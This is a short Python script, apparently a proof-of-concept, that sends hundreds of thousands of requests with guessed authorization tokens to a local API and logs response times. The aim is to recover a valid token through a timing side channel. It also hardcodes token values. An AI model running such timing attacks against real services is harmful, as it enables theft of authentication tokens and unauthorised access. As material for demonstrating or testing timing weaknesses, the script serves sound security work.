#!/usr/bin/env python

import sys
import requests

VALID_TOKEN = '224a93060c0dd4fb931d05083b4cb7b6a8c27df8'
NEAR_TOKEN =  '224b543064bef6e351a84f4dc68ba43c7c8f6965'

GUESS_FOURTH_OK =   '224a' + '0' * 36
GUESS_FOURTH_FAIL = '224c' + '0' * 36

TOKEN = GUESS_FOURTH_FAIL

URL = 'http://127.0.0.1:8000/users/'
NUM_SAMPLES = 500000
OUTPUT = 'token-timing-%s.txt' % TOKEN


def progress(count, total, suffix=''):
    bar_len = 80
    filled_len = int(round(bar_len * count / float(total)))

    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)

    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', suffix))
    sys.stdout.flush()  # As suggested by Rom Ruben


def send_requests():
    session = requests.Session()
    output = file(OUTPUT, 'w')

    for i in xrange(NUM_SAMPLES):
        response = session.get(URL, headers={'Authorization': 'Token %s' % TOKEN})
        output.write('%s\n' % response.headers['X-Runtime'])

        if i % 500 == 0:
            progress(i, NUM_SAMPLES)

if __name__ == '__main__':
    send_requests()